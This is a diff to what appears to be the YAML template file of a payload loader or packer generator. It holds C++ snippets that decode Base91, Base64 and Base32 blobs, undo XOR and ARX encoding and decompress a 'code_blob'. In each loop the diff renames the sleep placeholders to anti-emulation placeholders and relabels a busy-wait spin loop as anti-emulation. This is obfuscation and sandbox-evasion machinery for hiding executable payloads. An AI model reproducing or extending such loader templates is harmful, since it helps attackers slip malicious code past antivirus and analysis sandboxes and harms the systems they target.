@@ -40,7 +40,7 @@ envelopes:
       unsigned int b = 0, n = 0;
       int v = -1;
       for (unsigned int i = 0; i < code_blob_text_len; ++i) {
-          {SLEEP_SNIPPET}
+          {ANTI-EMULATION-SNIPPET}
           unsigned char c = (unsigned char)code_blob_text[i];
           int d = (c < 256) ? b91_dec[c] : -1;
           if (d < 0) continue;
@@ -78,7 +78,7 @@ envelopes:
       unsigned int enc_len = 0;
       unsigned int val = 0; int valb = -8;
       for (unsigned int i=0;i<code_blob_text_len;++i){
-          {SLEEP_SNIPPET}
+          {ANTI-EMULATION-SNIPPET}
           int d = B64_DEC[(unsigned char)code_blob_text[i]];
           if (d == -1) continue;
           val = (val<<6) | (unsigned)d; valb += 6;
@@ -106,7 +106,7 @@ envelopes:
       unsigned int enc_len = 0;
       unsigned int val = 0; int valb = -8;
       for (unsigned int i=0;i<code_blob_text_len;++i) {
-          {SLEEP_SNIPPET}
+          {ANTI-EMULATION-SNIPPET}
           unsigned char c = (unsigned char)code_blob_text[i];
           if (c == '=') continue; // skip padding
           int d = B32_DEC[c];
@@ -157,7 +157,7 @@ encoders:
       unsigned char* comp_buf = new unsigned char[enc_len];
       unsigned int comp_len = enc_len;
       for (unsigned int i = 0; i < enc_len; ++i) {
-          {SLEEP_SNIPPET}
+          {ANTI-EMULATION-SNIPPET}
           comp_buf[i] = enc_buf[i] ^ {xor_key}[i % {xor_key_len}];
       }
 
@@ -177,7 +177,7 @@ encoders:
       unsigned char* comp_buf = new unsigned char[enc_len];
       unsigned int comp_len = enc_len;
       for (unsigned int i = 0; i < enc_len; ++i) {
-          {SLEEP_SNIPPET}
+          {ANTI-EMULATION-SNIPPET}
           unsigned char b = enc_buf[i] ^ {xor_key2}[i % {xor_key2_len}];
           comp_buf[i] = b ^ {xor_key1}[i % {xor_key1_len}];
       }
@@ -204,7 +204,7 @@ encoders:
       unsigned char* comp_buf = new unsigned char[enc_len];
       unsigned int comp_len = enc_len;
       for (unsigned int i = 0; i < enc_len; ++i) {
-          {SLEEP_SNIPPET}
+          {ANTI-EMULATION-SNIPPET}
           unsigned char k = {arx_key}[i & 15];
           unsigned char r = (unsigned char)((k ^ i) & 7);
           unsigned char b = enc_buf[i];
@@ -239,7 +239,7 @@ encoders:
       unsigned int comp_len = enc_len;
       /* invert pass 2 (key2) */
       for (unsigned int i = 0; i < enc_len; ++i) {
-          {SLEEP_SNIPPET}
+          {ANTI-EMULATION-SNIPPET}
           unsigned char k = {arx_key2}[i & 15];
           unsigned char r = (unsigned char)((k ^ i) & 7);
           unsigned char b = enc_buf[i];
@@ -250,7 +250,7 @@ encoders:
       }
       /* invert pass 1 (key1) */
       for (unsigned int i = 0; i < enc_len; ++i) {
-          {SLEEP_SNIPPET}
+          {ANTI-EMULATION-SNIPPET}
           unsigned char k = {arx_key1}[i & 15];
           unsigned char r = (unsigned char)((k ^ i) & 7);
           unsigned char b = comp_buf[i];
@@ -310,7 +310,7 @@ compressors:
       unsigned char* code_blob = new unsigned char[code_blob_cap];
       unsigned int code_blob_len = 0;
       for (unsigned int i = 0; i < comp_len; ++i) {
-          {SLEEP_SNIPPET}
+          {ANTI-EMULATION-SNIPPET}
           unsigned char cb = comp_buf[i];
           if (cb == 0xFFu) {
               if (i + 1 < comp_len) {
@@ -329,13 +329,13 @@ compressors:
           }
       }
 
-sleeps:
+anti-emulation:
   - index: 1
     name: spin
     desc: Busy-wait loop for N iterations (duration = iterations)
     args: [duration]
     cpp_snippet: |
-      /* sleep: spin */
+      /* anti-emulation: spin */
       for (volatile unsigned int __sleep_i = 0; __sleep_i < (unsigned int){duration}; ++__sleep_i) { /* noop */ }
 
   - index: 2
